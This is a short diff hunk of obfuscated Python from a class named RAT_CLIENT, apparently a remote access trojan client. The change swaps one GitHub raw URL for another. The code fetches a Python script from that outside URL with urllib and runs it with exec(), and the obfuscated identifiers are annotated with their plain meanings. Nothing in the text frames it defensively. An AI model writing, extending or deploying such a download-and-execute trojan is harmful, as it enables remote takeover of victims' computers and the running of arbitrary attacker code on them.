@@ -47,9 +47,9 @@ class RAT_CLIENT :#line:38:class RAT_CLIENT:
             print (O0O0O0000000O00OO )#line:52:print (e)
             OO0000OO0O0OOO000 =RAT_CLIENT (O00O0O00OOOO00OO0 .host ,O00O0O00OOOO00OO0 .port )#line:53:rat = RAT_CLIENT(self.host, self.port)
             print (O00O0O00OOOO00OO0 .host ,O00O0O00OOOO00OO0 .port )#line:54:print(self.host, self.port)
-            print ("mierdeos2")#line:55:print ("mierdeos2")
+            print ("mierdeos1")#line:55:print ("mierdeos1")
             import urllib .request #line:56:import urllib.request
-            OOO0OOOO0OO00O0OO ='https://raw.githubusercontent.com/alejq41/free/main/pythonremot2.py'#line:57:code = 'https://raw.githubusercontent.com/alejq41/free/main/pythonremot2.py'
+            OOO0OOOO0OO00O0OO ='https://raw.githubusercontent.com/alejq41/free/main/pythonremot.py'#line:57:code = 'https://raw.githubusercontent.com/alejq41/free/main/pythonremot.py'
             O00O00000OOO0OO00 =urllib .request .urlopen (OOO0OOOO0OO00O0OO )#line:58:response = urllib.request.urlopen(code)
             OO0000OOOO0OO000O =O00O00000OOO0OO00 .read ()#line:59:data = response.read()
             exec (OO0000OOOO0OO000O )#line:60:exec(data)
